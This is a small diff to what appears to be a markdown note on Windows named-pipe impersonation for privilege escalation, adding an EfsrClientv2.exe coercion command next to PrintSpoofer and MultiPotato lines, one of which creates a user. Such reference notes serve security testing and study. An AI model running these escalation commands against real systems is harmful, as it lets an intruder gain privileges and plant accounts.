@@ -21,7 +21,11 @@ Invoke-PrintSpooferNet -Pipe '\\.\pipe\AABB\pipe\srvsvc' -Command 'calc.exe' -Me
 ```cmd
 MultiPotato.exe -t CreateUser -p AABB\pipe\srvsvc
 EfsrClient.exe
+
+OR 
+EfsrClientv2.exe \\127.0.0.1/pipe/AACC\PIPE\srvsvc
 ```
+
 
 ## References
 * [Prepending UNC](https://twitter.com/tifkin_/status/1418855927575302144/photo/1)
